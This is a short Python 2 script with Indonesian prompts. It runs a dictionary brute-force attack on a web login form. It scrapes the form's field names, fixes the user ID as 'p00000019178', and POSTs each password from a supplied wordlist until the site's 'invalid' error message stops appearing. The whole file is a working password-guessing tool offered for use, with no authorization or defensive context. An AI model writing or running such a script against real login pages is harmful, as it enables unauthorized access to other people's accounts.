#!/usr/bin/env python
import ambiltag
import requests
import string
import time
# import urllib
# import re
# from bs4 import BeautifulSoup



input1 = raw_input("Masukkan URL halaman login : ")

html_ekstrak = ambiltag.fetchHTMLdoc(input1)
list_variabel_input = ambiltag.fetchListInput(html_ekstrak)

file = open(raw_input("Masukkan path ke word list yang digunakan : "), 'rt')

for x in file.readlines():
	x = x.strip()
	print "Trying " + x
	data1 = {
		list_variabel_input[0] : "p00000019178",
		list_variabel_input[1] : "%s" %x
	}
	print data1
	response = requests.post(input1, data1)
	if "Your User ID and/or Password are invalid." not in response.text:
		print x + " Success!"
		break

ambiltag.getFormAction(html_ekstrak)